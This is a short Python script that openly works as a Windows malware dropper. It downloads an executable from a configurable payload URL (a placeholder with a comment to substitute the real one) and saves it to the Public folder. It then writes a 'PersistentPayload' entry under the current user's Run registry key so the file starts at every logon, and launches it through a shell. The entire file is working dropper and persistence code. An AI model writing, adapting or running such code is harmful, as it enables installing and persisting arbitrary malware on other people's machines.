import os
import requests
import winreg
import subprocess

# Configuration
PAYLOAD_URL = "http://example.com/payload.exe"  # Change this to your actual payload URL
SAVE_PATH = os.path.join(os.getenv("PUBLIC"), "payload.exe")  # Saves to C:\Users\Public\payload.exe
REG_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"
REG_NAME = "PersistentPayload"  # Name of the registry key

def download_payload(url, save_path):
    # Download the payload from the url and save it to the specified file location
    try:
        # Get information from the url
        response = requests.get(url, stream=True)
        # Test the response, will raise an error and fail if there's a problem
        response.raise_for_status()
        
        # Save the information from the url to the newly created file
        with open(save_path, "wb") as file:
            for chunk in response.iter_content(chunk_size=1024):
                file.write(chunk)

        print(f"[+] Payload downloaded to {save_path}")
        return True
    except Exception as e:
        print(f"[-] Failed to download payload: {e}")
        return False

def add_persistence(exe_path):
    # Add the file to winreg so it runs on startup
    try:
        # Uses the key for the current user and a new registry path to open a winreg key so that it can be reconfigured with a new value
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_SET_VALUE)
        # Sets the value of the opened key to the file that was created previously
        winreg.SetValueEx(key, REG_NAME, 0, winreg.REG_SZ, exe_path)
        # Closes the key
        winreg.CloseKey(key)
        print("[+] Persistence added to registry")
    except Exception as e:
        print(f"[-] Failed to add persistence: {e}")

def execute_payload(exe_path):
    # Executes the payload
    try:
        # Tries to execute the payload through the shell
        subprocess.Popen(exe_path, shell=True)
        print("[+] Payload executed")
    except Exception as e:
        print(f"[-] Failed to execute payload: {e}")

if __name__ == "__main__":
    # Test if the file can be made and used, then run the code if it works
    if download_payload(PAYLOAD_URL, SAVE_PATH):
        add_persistence(SAVE_PATH)
        execute_payload(SAVE_PATH)